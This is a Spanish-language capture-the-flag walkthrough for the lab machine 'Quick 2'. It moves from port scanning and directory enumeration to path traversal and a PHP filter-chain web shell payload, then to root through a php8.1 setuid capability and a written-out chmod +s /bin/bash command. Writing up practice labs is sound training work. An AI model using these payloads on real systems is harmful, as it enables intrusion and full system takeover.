## MAQUINA QUICK 2

![imagen]

Comenzamos haciendo un escaneo de puertos con nmap.

> nmap -p- --open -sS -sC -sV --min-rate 4000 "IP" -oN target.txt

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20201205.png)

Encontramos el puerto 22 ssh y el 80 http abiertos.
Ingresamos al puerto servidor web (port 80) ya que no poseemos ninguna credencial para loguearnos en el ssh

![imagen]

Luego de revisar la pagina, realizamos una enumeracion de directorios ocultos con gobuster.

> gobuster --url "IP" -w "/wordlists" -t 100 -x html,php,txt,js

![imagen]

La enumeracion encontro un directorio llamado file.php. Ingresando alli, la web contiene una barra donde al parecer podemos leer archivos o ingresar algun comando.

Utilizamos nikto para ver si la web es vulnerable a algo

>nikto -host "ip"

![imagen]

Como resultado de nikto la web contiene a una vulnerabilidad de file traversal, lo que significa que podemos leer archivos que esten dentro de la maquina.

Probamos leyendo el "/etc/passwd/"  y nos representa por la web el contenido del mismo.

![imagen]

Vemos que hay 2 usuarios, el usuario: nick y el usuario: andrew.

Prendemos el burpsuite para ver como esta corriendo el programa por dentro, Y con el la herramienta "php_filter_chain_generator.py" vamos a crear un cadena de filtros para el php.

> python3 php_filter_generator.py --chain '<?php system($_GET["cmd"]);?>'

Una vez generada la cadena, lo enviamos al burpsuite >> repeater >> y luego del "cmd" colocamos el comando a utilizar en este caso "id".

![imagen]

Si todo esta bien como resultados muestra que el id es igual a www-data.

Con esto leemos el archivo FILE.php que nos quedo pendiente.

Despues del "php://temp" agreamos el comando 
"=&cmd=" (y de aca colocamos lo que queremos hacer, ejemplo (ls,ipa,whoami, etc)). 

![imagen]

Bien continuando, ya que podemos ingresar linea de comandos, generamos un RV encondeada para conectarnos desde la maquina victima a la maquina atacante.

![imagen]

Genial, una vez dentro vamos a escalar privilegios ya ingresamo como el usuario www-data.

Leemos las tareas crontab con el comando

>getcap -r 2>/dev/null

Obtenemos como resultado una capabilities /usr/bin/php8.1 cap_setuid=ep

![imagen]

Buscamos en gtfobins si tenemos alguna manera de escalar priv con php8.1 y si utilizamos el comando proporcionado por la pagina y listo somos user root.

Les dejo el comando por si no lo entienden:

> /usr/bin/php8.1 -r "posix_setuid(0); system('chmod +s /bin/bash/');"
> /bin/bash -p

ROOT






